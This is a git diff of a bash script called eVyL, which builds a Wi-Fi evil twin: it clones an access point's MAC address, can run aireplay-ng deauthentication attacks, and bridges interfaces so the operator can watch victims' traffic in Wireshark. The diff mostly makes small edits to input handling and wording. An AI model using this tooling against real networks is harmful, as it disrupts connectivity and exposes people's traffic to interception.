@@ -6,11 +6,11 @@ echo "________________________________________________________"&&echo
 echo "	               Welcome to eVyL"&&echo
 echo "________________________________________________________"
 
-echo&&scriptName=$HOME/Documents/unix_scripts/evyl.sh
+echo&&scriptPath=$HOME/Documents/unix_scripts/evyl.sh
 sleep 3
 echo "Created on 01/08/2017 by Marc Pascual i Solé. Mail me at mpasole@protonmail.com"
 sleep 1.3
-echo "Last Modification:" $(stat $scriptName | grep Modify | gawk '{ FS = " " } {print $2}')
+echo "Last Modification:" $(stat $scriptPath | grep Modify | gawk '{ FS = " " } {print $2}')
 sleep 0.3
 sleep 0.5
 echo "This program clones an Access Point's MAC Address "
@@ -61,12 +61,14 @@ read b
 
 #DEAUTH
 case $b in
-        "Y"|"y")
+        "Y"|"y"|"yes"|"Yes")
 		echo -n "[*] How many DEAUTH-PACKETS?: "&& read NUM &&echo
 		sleep 2
 		echo "[+] Opening XTERM Console"
                 sudo xterm -hold -e "aireplay-ng -0 $NUM -a $apMac $interface" &
 		;;
+	*)
+		sleep 2&&echo "Not deauthenticating anything"
 esac
 sleep 5&&echo&&echo "[+] BRIDGING interfaces with Bridge-utils..."
 
@@ -88,5 +90,5 @@ sleep 3
 
 
 echo&&sleep 2&&echo "Done. :)"&&sleep 1
-echo "You have created $essid""s EVIL TWIN xD"&&sleep 2&&echo "You can now monitor traffic with WireShark"&&sleep 2
+echo "You have created $essid""s EVIL TWIN xD"&&sleep 2&&echo "You can now monitor traffic with WireShark or other"&&sleep 2
 echo "Exitting..."
